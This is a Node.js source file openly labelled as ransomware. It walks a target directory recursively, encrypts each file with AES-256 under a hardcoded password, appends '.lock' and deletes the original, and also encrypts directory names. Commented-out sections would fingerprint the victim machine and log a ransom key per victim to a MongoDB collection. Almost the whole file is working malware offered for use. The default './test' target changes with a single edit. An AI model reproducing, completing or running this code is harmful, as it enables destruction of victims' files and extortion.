/*
  ========================================================
  Author: Kyle Tilano (Kairu)
  Project: RansomWare (Node.js)
  GitHub: https://github.com/Kairu-bit/RansomWareJS
  Contact: kyletilano@gmail.com 
  Website: https://kairudev.vercel.app
  License: MIT
  ========================================================
*/

import crypto from "crypto";
import fs from "fs";
import path from "path";

/*import dotenv from "dotenv";
import os from "os";
import system from "systeminformation";
import mongoose, { Schema } from "mongoose";
import { exit } from "process";

console.log("Initializing Environment Variables...");
dotenv.config({ path: path.join(os.homedir(), ".env") });

const mongoURI = process.env.MONGODB_URI

console.log("Connecting to MongoDB...");
try{
  await mongoose.connect(mongoURI, { "dbName": "ransom" });
  console.log("MongoDB Connected.");
}
catch(e){
  console.error("MongoDB Connection Error:", e);
  exit();
}*/

// Target directory for the ransomware to process
const targetDirectory = "./test"; // Change this to the desired directory for testing

// Define the algorithms used for file and directory encryption
const fileAlgorithm = 'aes-256-ctr'; // AES algorithm for files
const dirAlgorithm = "aes-256-cbc"; // AES algorithm for directories

// Password used for encryption and decryption
const pass = 'kiffy'; // You can change this to any string you prefer
const key = crypto.createHash('sha256').update(pass).digest(); // Generate a SHA-256 hash of the password for encryption key/*

/*const schema = new Schema({
  data: Schema.Types.Mixed
}, { strict: false });


let Collection;
try {
  Collection = mongoose.model("ransomvictim", schema);
} catch (error) {
  if (error.name === 'OverwriteModelError') {
    Collection = mongoose.model("ransomvictim");
  }
}

async function randBase64(minSize = 20, maxSize = 30){
  const ransomkey = crypto.randomBytes(crypto.randomInt(minSize, maxSize)).toString("base64");
  const { kernel } = await system.osInfo();
  const { serial, model } = await system.system();
  const rwvictiminfo = {
    kernel,
    serial,
    model,
    ransomkey
  };
  console.log("RWVictimInfo", rwvictiminfo);
  const victims = await Collection.find({ kernel, serial, model });
  if (victims.length){
    return victims[0].ransomkey;
  }
  else{
    const victim = new Collection(rwvictiminfo);
    await victim.save();
    return ransomkey;
  }
}*/

/**
 * Encrypts a directory name using a password.
 * 
 * @param {string} dirName - The name of the directory to encrypt.
 * @param {string} password - The password to use for encryption.
 * @returns {string} The encrypted directory name.
 */
function encryptDirectory(dirName, password) {
  const key = crypto.scryptSync(password, 'salt', 32);
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv(dirAlgorithm, key, iv);
  let encrypted = cipher.update(dirName, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  encrypted = iv.toString('hex') + encrypted;
  console.log(`Encrypted directory: ${dirName}`);
  return encrypted;
}

/**
 * Decrypts an encrypted directory name using a password.
 * 
 * @param {string} encryptedDir - The encrypted directory name.
 * @param {string} password - The password to use for decryption.
 * @returns {string} The decrypted directory name.
 */
function decryptDirectory(encryptedDir, password) {
  const ivHex = encryptedDir.slice(0, 32);
  const encrypted = encryptedDir.slice(32);
  const iv = Buffer.from(ivHex, 'hex');
  const key = crypto.scryptSync(password, 'salt', 32);
  const decipher = crypto.createDecipheriv(dirAlgorithm, key, iv);
  let decrypted = decipher.update(encrypted, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  console.log(`Decrypted directory: ${encryptedDir}`);
  return decrypted;
}

/**
 * Encrypts a file and saves it with a '.lock' extension.
 * 
 * @param {string} filePath - The path of the file to encrypt.
 */
function encryptFile(filePath) {
  console.log(`Encrypting file: ${filePath}`);
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv(fileAlgorithm, key, iv);
  const input = fs.createReadStream(filePath);
  const output = fs.createWriteStream(filePath + '.lock');

  input.pipe(cipher).pipe(output);

  output.on('finish', () => {
    fs.appendFileSync(filePath + '.lock', iv);
    fs.unlinkSync(filePath);
    console.log(`File encrypted and renamed: ${filePath}.lock`);
  });
}

/**
 * Decrypts a file and restores its original content.
 * 
 * @param {string} filePath - The path of the encrypted file.
 */
function decryptFile(filePath) {
  console.log(`Decrypting file: ${filePath}`);
  const fileBuffer = fs.readFileSync(filePath);
  const iv = fileBuffer.slice(-16);
  const content = fileBuffer.slice(0, -16);
  const decipher = crypto.createDecipheriv(fileAlgorithm, key, iv);
  const outputFilePath = filePath.replace('.lock', '');
  const output = fs.createWriteStream(outputFilePath);

  output.write(decipher.update(content));
  output.write(decipher.final());

  fs.unlinkSync(filePath);
  console.log(`File decrypted: ${outputFilePath}`);
}

/**
 * Checks if a string is a valid hexadecimal value.
 * 
 * @param {string} text - The text to check.
 * @returns {boolean} `true` if the text is hexadecimal, otherwise `false`.
 */
function isHexadecimal(text) {
  const hexRegex = /^[0-9A-Fa-f]+$/;
  return hexRegex.test(text);
}

/**
 * Processes a directory by encrypting or decrypting its contents.
 * 
 * @param {string} directory - The path of the directory to process.
 */
function processDirectory(directory) {
  console.log(`Processing directory: ${directory}`);
  const items = fs.readdirSync(directory, "utf8");

  for (let i = 0; i < items.length; i++) {
    const fullPath = path.join(directory, items[i]);
    if (fs.lstatSync(fullPath).isFile()) {
      if (!items[i].endsWith('.lock')) {
        encryptFile(fullPath);
      } else {
        decryptFile(fullPath);
      }
    } else if (fs.lstatSync(fullPath).isDirectory() && fs.readdirSync(fullPath).length !== 0) {
      const dirArray = fullPath.split(path.sep);
      const lastDirectory = dirArray.pop();
      let newPath;

      if (isHexadecimal(lastDirectory)) {
        const decryptedDir = decryptDirectory(lastDirectory, pass);
        newPath = path.join(dirArray[0] === "" ? "/" : "", ...dirArray, decryptedDir);
        fs.renameSync(fullPath, newPath);
        console.log(`Renamed directory: ${fullPath} -> ${newPath}`);
      } else {
        const encryptedDir = encryptDirectory(lastDirectory, pass);
        newPath = path.join(dirArray[0] === "" ? "/" : "", ...dirArray, encryptedDir);
        fs.renameSync(fullPath, newPath);
        console.log(`Renamed directory: ${fullPath} -> ${newPath}`);
      }
      processDirectory(newPath);
    }
  }
}

processDirectory(targetDirectory);

